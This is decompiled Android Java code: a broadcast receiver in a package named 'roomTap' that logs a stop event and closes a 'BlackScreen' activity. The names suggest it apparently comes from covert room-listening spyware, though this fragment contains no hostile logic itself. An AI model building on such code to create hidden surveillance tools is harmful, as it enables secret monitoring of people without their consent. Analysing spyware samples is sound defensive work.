package com.network.android.roomTap;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import com.network.android.c.a.a;

final class j extends BroadcastReceiver {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ BlackScreen f121a;

    j(BlackScreen blackScreen) {
        this.f121a = blackScreen;
    }

    public final void onReceive(Context context, Intent intent) {
        try {
            a.a("BlackScreen BroadcastReceiver got stop event");
            this.f121a.a();
        } catch (Exception e) {
            a.a("BlackScreen finish Exception- " + e.getMessage(), e);
        }
    }
}
